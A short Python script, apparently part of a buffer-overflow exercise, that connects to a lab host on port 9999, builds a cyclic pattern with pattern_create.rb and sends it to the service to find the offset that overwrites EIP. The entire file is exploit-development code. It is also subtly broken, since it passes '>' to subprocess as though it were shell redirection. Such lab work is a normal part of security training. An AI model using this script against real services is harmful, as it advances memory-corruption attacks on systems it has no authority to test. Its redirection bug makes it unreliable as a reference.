''' find_offset.py: create a unique pattern, send it to the target, match to EIP
'''

import sys, socket, subprocess
host = "192.168.56.103"
port = 9999


#send_len = 3100
send_len = int(input(">> Input buffer size (from fuzz.py): ")) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # connect 
    s.connect((host, port))
    s.recv(1024)
    # create pattern
    create_pattern = subprocess.check_output(["./pattern_create.rb", "-l", str(send_len), ">", "./overflow_pattern"])
    # read pattern into variable 
    pattern = subprocess.check_output(["cat", "./overflow_pattern"]).replace(b'\n', b'')
    # send pattern to target
    s.sendall(pattern)
    #print("Sent")
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
